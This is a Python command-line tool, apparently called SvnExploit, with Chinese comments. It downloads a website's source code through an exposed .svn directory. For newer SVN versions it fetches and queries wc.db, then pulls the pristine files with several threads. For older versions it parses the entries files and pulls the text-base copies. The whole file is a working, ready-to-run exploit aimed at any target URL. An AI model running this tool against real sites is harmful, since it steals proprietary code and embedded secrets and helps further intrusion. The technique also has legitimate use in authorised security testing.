#coding=utf-8

import requests,threading
import sqlite3,os,re,sys,optparse
from prettytable import PrettyTable

"""
第三方库：requests,prettytable
 * 全局变量定义区
"""
header={'accept':'text/html,application/xhtml+xml,application/xml',
        'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36',
        'referer':'http://baidu.com'}
table_dump = ''
if sys.version_info < (3, 0): # 兼容py2和py3
    import Queue as queue
else:
    import queue

download_queue = queue.Queue()

# 下载wc.db
def download_db(url):
    db_url = url+"wc.db"
    # 判断存放数据库的目录是否存在
    if(not os.path.exists('dbs')):
        os.makedirs('dbs')
    #匹配url中的host，然后作为文件夹名
    pattern = re.compile(r'(?:\w+\.+)+(?:\w+)')
    host = pattern.findall(url)
    # 判断host 这个目录是否存在，如果存在的话就创建 host(i) i 递增
    if(not os.path.exists("dbs/"+host[0])):
        os.makedirs("dbs/"+host[0])
        path = "dbs/"+host[0]
    else:
        i = 1
        while (os.path.exists("dbs/"+host[0]+"("+str(i)+")")):
            i = i+1
        os.makedirs("dbs/"+host[0]+"("+str(i)+")")
        path = "dbs/"+host[0]+"("+str(i)+")"

    # 组成最终地址
    db_path = path+"/wc.db"
    # 下载数据库
    res = requests.get(db_url,headers=header)
    if res.status_code!=200:
        print("[-] 未找到%s/wc.db"%url)
        sys.exit()
    with open(db_path,"wb") as file:
        file.write(res.content)
    return db_path

# 连接数据库，查询数据库 然后把 local_relpath \ kind \ checksum 取出来
def db_conn(db_path):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("select local_relpath,kind,checksum from NODES")
        values = cursor.fetchall()
        return values
    except:
        print("[-] wc.db连接失败!")

def print_values(values):
    #print("[+] 文件名 | 文件类型 | checksum")
    table = PrettyTable(["文件名","文件类型","CheckSum"])
    for v in values:
        if v[0] :
            #print("[+] %s   %s   %s" %(v[0],v[1],v[2]))
            table.add_row([v[0],v[1],v[2]])
    table.sort_key("CheckSum")
    table.reversesort = True
    print(table)

# 用queue存放values中的记录，供下载源码使用
def gen_queue(values):
    global download_queue
    for v in values:
        if v[0]:
            download_queue.put(v)

def down_file(url,db_path):
    # 获取下载后保存的本地地址
    path = os.path.dirname(db_path) # dbs/127.0.0.1

    while not download_queue.empty(): # 如果queue不为空
        value = download_queue.get()
        #print(value)
        #sys.exit()
        if value[1]=="dir":
            if not os.path.exists(path +"/"+ value[0]):
                try:
                    os.makedirs(path +"/"+ value[0])
                except:
                    pass
        else:
            # 如果checksum == None 说明文件已经被删除
            if value[2] == None:
                continue
            # 处理checksum
            checksum = value[2][6:]
            url_file = url+"pristine/"+checksum[:2]+"/"+checksum+".svn-base"
            file_uri = ".svn/pristine/"+checksum[:2]+"/"+checksum+".svn-base"
            #print(url_file)
            # 下载代码
            global table_dump
            try:
                res = requests.get(url_file,headers=header)
            except:
                #print("[-] 下载%s失败!" %url_file)
                table_dump.add_row([value[0],file_uri,'下载失败'])
                continue
            if not os.path.exists(os.path.dirname(path+"/"+value[0])):
                try:
                    os.makedirs(os.path.dirname(path+"/"+value[0]))
                except:
                    pass
            with open(path+"/"+value[0],"wb") as file :
                file.write(res.content)
                #global table_dump
                table_dump.add_row([value[0], file_uri, '下载成功'])
        download_queue.task_done() # 通知队列已消费完该任务

def banner():
    print(""" ____             _____            _       _ _   
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_ 
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_ 
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|                 
SvnExploit - Dump the source code by svn

""")

def svnMoreThan1_7(url,isdump):
    # svn > 1.7
    db_path = download_db(url)
    values = db_conn(db_path)
    # 判断是否要dump
    if not isdump:
        print_values(values)
    else:
        global table_dump
        global download_queue
        table_dump = PrettyTable(['文件名','URL','下载状态'])
        print_values(values)
        gen_queue(values)
        threads = []
        for i in range(options.thread_num):
            thread = threading.Thread(target=down_file, args=(url, db_path,))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

        print("[+] 已经Dump完成!")

def SvnVersion(url):
    # if SVN version > 1.7 return True ,else return false
    url = url + 'entries'
    res = requests.get(url,headers=header)
    #print(res.text)
    if b'12\n' == res.content:
        return True
    else:
        return False

class SvnLessThan1_7:
    def __init__(self,url):
        self.url = url
        # http://192.168.1.128/.svn/
        self.file_list = []
        self.dir_list = []
        self.flag = False
        #print(url)
    # 解析entries
    def entries(self,url,dir):
        #print(1)
        res = requests.get(url,headers=header)
        list = res.text.split('\n')
        i = 0
        for data in list:

            if data == "file":
                if list[i-1]:
                    if dir:
                        self.file_list.append(dir+'/'+list[i-1])
                    else:
                        self.file_list.append(list[i - 1])
                    #print(dir+list[i-1])
            elif data == "dir":
                if list[i-1]:
                    if dir:
                        self.dir_list.append(dir+'/'+list[i-1])
                    else:
                        self.dir_list.append(list[i-1])
                    self.flag = True
            i = i+1
    # 循环解析entries
    def forloop(self):
        for dir in self.dir_list:
            #print(os.path.dirname(os.path.dirname(self.url))+dir+'.svn/entries')
            self.entries(os.path.dirname(os.path.dirname(self.url))+'/'+dir+'/.svn/entries',dir)

    # print file
    def print_file(self):
        #print(1)
        self.entries(self.url+'entries','')
        if self.flag:
            self.forloop()
        table = PrettyTable(['文件名','文件类型','URL'])
        for name in self.file_list:
            #print(name)
            table.add_row([name,'file',
                           os.path.dirname(name)+'/.svn/text-base/'+os.path.basename(name)+'.svn-base'
                           ])
        table.sort_key("URL")
        table.reversesort = True
        print(table)

    def dumpFile(self):
        if (not os.path.exists('dbs')):
            os.makedirs('dbs')
            # 匹配url中的host，然后作为文件夹名
        pattern = re.compile(r'(?:\w+\.+)+(?:\w+)')
        host = pattern.findall(self.url)
        # 判断host 这个目录是否存在，如果存在的话就创建 host(i) i 递增
        if (not os.path.exists("dbs/" + host[0])):
            os.makedirs("dbs/" + host[0])
            path = "dbs/" + host[0]
        else:
            i = 1
            while (os.path.exists("dbs/" + host[0] + "(" + str(i) + ")")):
                i = i + 1
            os.makedirs("dbs/" + host[0] + "(" + str(i) + ")")
            path = "dbs/" + host[0] + "(" + str(i) + ")"
        self.entries(self.url+'entries','')
        self.forloop()
        #print(self.dir_list)
        for dir in self.dir_list:
            #print(path+dir)
            if not os.path.exists(path+'/'+dir):
                os.makedirs(path+'/'+dir)
        table = PrettyTable(['文件名','URL','下载状态'])
        for file in self.file_list:
            if os.path.dirname(file):
                file_url =os.path.dirname(os.path.dirname(self.url))+'/'+os.path.dirname(file)+'/.svn/text-base/'+os.path.basename(file)+'.svn-base'
            else:
                file_url = os.path.dirname(os.path.dirname(self.url)) + os.path.dirname(
                    file) + '/.svn/text-base/' + os.path.basename(file) + '.svn-base'
            res = requests.get(file_url,headers=header)
            with open(path+'/'+file,'wb') as f:
                f.write(res.content)
                table.add_row([file,
                               os.path.dirname(file)+'/.svn/text-base/'+os.path.basename(file)+'.svn-base',
                               '下载成功'
                               ])
        table.sort_key('URL')
        table.reversesort=True
        print(table)


def svnLessThan1_7(url,isdump):
    svn = SvnLessThan1_7(url)
    #print(1)
    if not isdump:
        svn.print_file()
    else:
        svn.dumpFile()

if __name__ == '__main__':
    """
    命令行参数：
        svnExp.py -u TargetURL [--dump --thread 5]
    """
    opt = optparse.OptionParser()
    opt.add_option("-u","--url",action="store",dest="url",help="TargetURL e.g.http://url/.svn")
    opt.add_option("--thread",action="store",dest="thread_num",type="int",default=5,
                   help="The thread num default is 5")
    opt.add_option("--dump",action="store_true",dest="dump",
                   help = "Dump file")
    (options, args) = opt.parse_args()
    if len(sys.argv) <2 :
        banner()
        print("example: SvnExploit.py -u http://192.168.27.128/.svn --dump")
        sys.exit()
    banner()
    if not options.url:
        print("[-] URL Error!")
    url = options.url
    # 在拿到url后判断后面是否有/ 如果没有就加上
    re_ = re.compile(r'[\w\.\/\:]+/$')
    if not re_.search(url):
        url = url+"/"
    # Get the svn version
    Sversion = SvnVersion(url)

    if Sversion:
        svnMoreThan1_7(url,options.dump)
    else:
        svnLessThan1_7(url,options.dump)
